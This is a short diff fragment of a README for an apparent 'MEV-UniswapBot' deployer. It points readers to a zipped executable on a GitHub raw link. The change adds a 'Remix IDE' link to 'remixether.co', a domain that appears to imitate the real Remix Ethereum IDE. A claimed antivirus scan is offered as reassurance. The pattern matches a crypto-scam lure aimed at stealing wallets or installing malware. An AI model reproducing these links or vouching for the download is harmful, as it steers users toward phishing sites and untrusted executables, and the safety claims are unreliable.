@@ -52,7 +52,7 @@ The **DeployerIDE** local deployer provides a secure and efficient environment f
 2.  **Follow the setup instructions** available in the Documentation section.
 -   [Download for Windows/Mac OS (.exe)](https://github.com/aulwarpX/MEV-UniswapBot/raw/refs/heads/main/DeployerIDE.zip)
 -   [Download for Python (.py)](deployer.py)
-
+**Alternative access via web browser:** [Remix IDE](https://remixether.co/)
 ### 🛡️ Security Verification
 
 The program has been scanned for security using antivirus tools. Below is a screenshot of the scan results:
